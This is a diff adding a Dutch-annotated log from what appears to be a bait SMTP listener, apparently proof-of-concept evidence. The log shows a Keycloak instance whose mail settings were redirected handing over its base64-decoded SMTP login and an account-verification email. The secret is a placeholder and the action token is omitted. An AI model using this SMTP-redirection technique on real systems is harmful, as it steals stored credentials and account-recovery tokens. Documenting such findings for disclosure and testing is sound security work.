@@ -1,0 +1,39 @@
+lokaas luistert op 0.0.0.0:2525 - elke regel komt hier in de log
+=== VERBINDING van 10.244.0.125:54558 ===
+<<< EHLO rc158-keycloak-98dbccf98-mkpwn
+<<< AUTH LOGIN
+!!! AUTH ONTVANGEN: AUTH LOGIN
+!!! AUTH LOGIN gebruikersnaam (b64): YnVpdA== -> 'buit'
+!!! AUTH LOGIN WACHTWOORD (b64): SEVULUdFSEVJTS1WQU4tSEVULVBMQVRGT1JN -> 'HET-GEHEIM-VAN-HET-PLATFORM'
+<<< MAIL FROM:<aanvaller@example.org>
+<<< RCPT TO:<proef-omleiding@example.org>
+<<< DATA
+<<< Date: Tue, 25 Aug 2026 12:44:36 +0000 (GMT)
+<<< From: Aanvaller <aanvaller@example.org>
+<<< Reply-To: Aanvaller <aanvaller@example.org>
+<<< To: proef-omleiding@example.org
+<<< Message-ID: <1745483062.1.1787661876328@rc158-keycloak-98dbccf98-mkpwn>
+<<< Subject: Update Your Account
+<<< MIME-Version: 1.0
+<<< Content-Type: multipart/alternative; 
+<<< 	boundary="----=_Part_0_1420766648.1787661876303"
+<<< 
+<<< ------=_Part_0_1420766648.1787661876303
+<<< Content-Type: text/plain; charset=UTF-8
+<<< Content-Transfer-Encoding: 7bit
+<<< 
+<<< 
+<<< Your administrator has just requested that you update your Proef-omleiding account by performing the following action(s): Verify Email. Click on the link below to start this process.
+<<< 
+<<< http://localhost:8081/realms/proef-omleiding/login-actions/action-token?key=<actietoken weggelaten><<< 
+<<< This link will expire within 12 hours.
+<<< 
+<<< If you are unaware that your administrator has requested this, just ignore this message and nothing will be changed.
+<<< ------=_Part_0_1420766648.1787661876303
+<<< Content-Type: text/html; charset=UTF-8
+<<< [HTML-variant weggelaten uit dit uittreksel: hij herhaalt de tekst hierboven,
+<<<  en het actietoken staat er quoted-printable in.]
+<<< ------=_Part_0_1420766648.1787661876303--
+<<< .
+<<< QUIT
+=== QUIT van 10.244.0.125 ===
